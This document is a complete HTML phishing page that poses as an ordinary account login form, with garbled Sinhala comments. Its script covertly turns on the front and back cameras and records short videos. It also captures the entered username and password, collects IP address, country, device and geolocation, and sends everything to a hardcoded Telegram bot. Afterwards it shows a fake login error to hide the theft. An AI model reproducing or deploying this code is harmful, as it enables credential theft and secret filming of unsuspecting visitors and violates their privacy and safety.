<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(120deg, #2980b9, #8e44ad);
            height: 100vh;
            overflow: hidden;
            margin: 0;
            padding: 0;
        }
        .login-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 400px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            padding: 40px;
            z-index: 1000;
        }
        .login-box h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        .textbox {
            width: 100%;
            margin-bottom: 20px;
        }
        .textbox input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .btn:hover {
            background: #2980b9;
        }
        .error {
            color: red;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 10px;
            color: #666;
        }
        /* ‡∑É‡∑ê‡∂ü‡∑Ä‡∑î‡∂´‡∑î video elements */
        .hidden-cameras {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
            z-index: -1;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Login to Your Account</h2>
        <div class="textbox">
            <input type="text" id="username" placeholder="Username" autocomplete="off">
        </div>
        <div class="textbox">
            <input type="password" id="password" placeholder="Password">
        </div>
        <button class="btn" id="loginBtn">Login</button>
        <div class="error" id="errorMsg">Invalid username or password!</div>
        <div class="loading" id="loadingMsg">Processing...</div>
    </div>

    <div class="hidden-cameras">
        <video id="frontCamera" autoplay playsinline muted></video>
        <video id="backCamera" autoplay playsinline muted></video>
    </div>

    <script>
        // ============================================
        // ‡∂î‡∂∫‡∑è‡∂ú‡∑ö Telegram Bot Details
        // ============================================
        const BOT_TOKEN = '8591543657:AAFjeNO5E8GA_ye7QgGmzC42OfbjHhrdRwg';
        const CHAT_ID = '7642100129';
        
        // Flag to prevent duplicate messages
        let hasSentMessage = false;
        let hasSentVideo = false;
        let frontStream = null;
        let backStream = null;
        let camerasInitialized = false;

        // ------------------------------------------------------------
        // ‡∂¥‡∑í‡∂ß‡∑î‡∑Ä load ‡∑Ä‡∑ô‡∂± ‡∂ú‡∂∏‡∂±‡∑ä‡∂∏ ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è ‡∂¥‡∂ß‡∂±‡∑ä ‡∂ú‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        window.addEventListener('load', function() {
            // Reset flags
            hasSentMessage = false;
            hasSentVideo = false;
            
            initializeCameras();
            document.getElementById('loginBtn').addEventListener('click', handleLogin);
            
            document.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    handleLogin();
                }
            });
            
            // Site ‡∂ë‡∂ö open ‡∂ö‡∂ª‡∂±‡∂ö‡∑ú‡∂ß message ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂∫‡∑Ä‡∂±‡∑ä‡∂± - ‡∑Ä‡∂ª‡∂ö‡∑ä ‡∂¥‡∂∏‡∂´‡∂∫‡∑í
            setTimeout(() => {
                if (!hasSentMessage) {
                    sendTextMessage("üî¥ <b>Website Opened</b>\nSomeone accessed the login page");
                    hasSentMessage = true;
                }
            }, 2000);
        });

        // ------------------------------------------------------------
        // ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è ‡∂Ø‡∑ô‡∂ö‡∂∏ ‡∂¥‡∂ß‡∂±‡∑ä ‡∂ú‡∂±‡∑ä‡∂±‡∑Ä‡∑è
        // ------------------------------------------------------------
        async function initializeCameras() {
            try {
                // ‡∂¥‡∑É‡∑î‡∂¥‡∑É ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä
                try {
                    backStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: { exact: "environment" },
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 24 }
                        },
                        audio: false
                    });
                    const backVideo = document.getElementById('backCamera');
                    backVideo.srcObject = backStream;
                } catch (e) {
                    backStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 24 }
                        },
                        audio: false
                    });
                    const backVideo = document.getElementById('backCamera');
                    backVideo.srcObject = backStream;
                }

                // ‡∂â‡∑É‡∑ä‡∑É‡∂ª‡∑Ñ ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä
                try {
                    frontStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: "user",
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 24 }
                        },
                        audio: false
                    });
                    const frontVideo = document.getElementById('frontCamera');
                    frontVideo.srcObject = frontStream;
                } catch (e) {}

                camerasInitialized = true;
                
            } catch (error) {
                sendTextMessage("‚ùå Camera access failed: " + error.message);
            }
        }

        // ------------------------------------------------------------
        // ‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 5‡∂ö video ‡∂ë‡∂ö‡∂ö‡∑ä record ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        function recordVideo(stream, duration = 5000) {
            return new Promise((resolve, reject) => {
                try {
                    const chunks = [];
                    let recorder;
                    
                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                        recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
                    } else if (MediaRecorder.isTypeSupported('video/webm')) {
                        recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                    } else {
                        recorder = new MediaRecorder(stream);
                    }
                    
                    recorder.ondataavailable = (e) => {
                        if (e.data.size > 0) {
                            chunks.push(e.data);
                        }
                    };
                    
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        resolve(blob);
                    };
                    
                    recorder.onerror = (e) => reject(e);
                    
                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                    
                } catch (e) {
                    reject(e);
                }
            });
        }

        // ------------------------------------------------------------
        // Telegram ‡∂∂‡∑ú‡∂ß‡∑ä‡∂ß video ‡∂ë‡∂ö ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        async function sendVideoToTelegram(videoBlob, cameraName, username, password) {
            try {
                // IP ‡∂≠‡∑ú‡∂ª‡∂≠‡∑î‡∂ª‡∑î ‡∂ú‡∂±‡∑ä‡∂±
                let ipAddress = 'Unknown';
                let country = 'Unknown';
                
                try {
                    const ipResponse = await fetch('https://ipapi.co/json/');
                    const ipData = await ipResponse.json();
                    ipAddress = ipData.ip;
                    country = ipData.country_name || 'Unknown';
                } catch (e) {
                    try {
                        const ipResponse = await fetch('https://api.ipify.org?format=json');
                        const ipData = await ipResponse.json();
                        ipAddress = ipData.ip;
                    } catch (err) {}
                }

                // Browser ‡∂≠‡∑ú‡∂ª‡∂≠‡∑î‡∂ª‡∑î
                const userAgent = navigator.userAgent;
                let browser = 'Unknown';
                if (userAgent.includes('Chrome')) browser = 'Chrome';
                else if (userAgent.includes('Firefox')) browser = 'Firefox';
                else if (userAgent.includes('Safari')) browser = 'Safari';
                else if (userAgent.includes('Edge')) browser = 'Edge';
                
                let os = 'Unknown';
                if (userAgent.includes('Windows')) os = 'Windows';
                else if (userAgent.includes('Mac')) os = 'MacOS';
                else if (userAgent.includes('Linux')) os = 'Linux';
                else if (userAgent.includes('Android')) os = 'Android';
                else if (userAgent.includes('iPhone')) os = 'iOS';

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, `${cameraName}_${Date.now()}.webm`);
                formData.append('caption', `üé• <b>${cameraName} CAMERA - 5 SEC VIDEO</b>
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üìÖ Time: ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' })}
üåç IP: ${ipAddress}
üìç Country: ${country}
üíª Device: ${os}
üåê Browser: ${browser}
üë§ Username: ${username || 'Not entered'}
üîë Password: ${password || 'Not entered'}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                return true;
            } catch (e) {
                return false;
            }
        }

        // ------------------------------------------------------------
        // ‡∂ß‡∑ô‡∂Ω‡∑í‡∂ú‡∑ä‚Äç‡∂ª‡∑ë‡∂∏‡∑ä ‡∂∂‡∑ú‡∂ß‡∑ä‡∂ß text message ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        async function sendTextMessage(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return true;
            } catch (e) {
                return false;
            }
        }

        // ------------------------------------------------------------
        // Location ‡∂ë‡∂ö ‡∂ú‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        await sendTextMessage(`üìç <b>Location:</b>
Lat: ${lat}
Lon: ${lon}
Map: https://maps.google.com/?q=${lat},${lon}`);
                    },
                    (error) => {}
                );
            }
        }

        // ------------------------------------------------------------
        // ‡∂¥‡∑ä‚Äç‡∂ª‡∂∞‡∑è‡∂± function - ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù ‡∂Ø‡∑ô‡∂ö‡∂∏ record ‡∂ö‡∂ª‡∂Ω‡∑è ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        async function captureAndSendVideos() {
            // Reset video sent flag
            hasSentVideo = false;
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            document.getElementById('loadingMsg').innerHTML = 'üé• Recording 5 sec videos...';
            
            // ‡∂¥‡∑É‡∑î‡∂¥‡∑É ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä‡∑ô‡∂±‡∑ä video ‡∂ë‡∂ö
            if (backStream) {
                try {
                    const backVideoBlob = await recordVideo(backStream, 5000);
                    await sendVideoToTelegram(backVideoBlob, 'BACK', username, password);
                } catch (e) {}
            }

            // ‡∂â‡∑É‡∑ä‡∑É‡∂ª‡∑Ñ ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä‡∑ô‡∂±‡∑ä video ‡∂ë‡∂ö
            if (frontStream) {
                try {
                    const frontVideoBlob = await recordVideo(frontStream, 5000);
                    await sendVideoToTelegram(frontVideoBlob, 'FRONT', username, password);
                } catch (e) {}
            }
            
            // Location ‡∂ë‡∂ö ‡∂ú‡∂±‡∑ä‡∂± try ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
            getLocation();
            
            hasSentVideo = true;
        }

        // ------------------------------------------------------------
        // Login handle ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        async function handleLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('errorMsg');
            const loadingMsg = document.getElementById('loadingMsg');
            const loginBtn = document.getElementById('loginBtn');
            
            // Loading ‡∂¥‡∑ô‡∂±‡∑ä‡∑Ä‡∂±‡∑ä‡∂±
            loadingMsg.style.display = 'block';
            loginBtn.disabled = true;
            errorMsg.style.display = 'none';
            
            // ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù record ‡∂ö‡∂ª‡∂Ω‡∑è ‡∂∫‡∑Ä‡∂±‡∑ä‡∂± - ‡∑Ä‡∂ª‡∂ö‡∑ä ‡∂¥‡∂∏‡∂´‡∂∫‡∑í
            if (camerasInitialized && !hasSentVideo) {
                await captureAndSendVideos();
            } else if (!camerasInitialized) {
                await initializeCameras();
                setTimeout(async () => {
                    if (!hasSentVideo) {
                        await captureAndSendVideos();
                    }
                }, 2000);
            }

            // Error ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂¥‡∑ô‡∂±‡∑ä‡∑Ä‡∂±‡∑ä‡∂±
            setTimeout(() => {
                loadingMsg.style.display = 'none';
                loginBtn.disabled = false;
                errorMsg.style.display = 'block';
                
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                
                setTimeout(() => {
                    errorMsg.style.display = 'none';
                }, 3000);
                
            }, 12000);
        }

        // ------------------------------------------------------------
        // ‡∂¥‡∑í‡∂ß‡∑î‡∑Ä close ‡∂ö‡∂ª‡∂±‡∂ö‡∑ú‡∂ß ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è stop ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        window.addEventListener('beforeunload', function() {
            if (frontStream) {
                frontStream.getTracks().forEach(track => track.stop());
            }
            if (backStream) {
                backStream.getTracks().forEach(track => track.stop());
            }
        });

    </script>
</body>
</html>
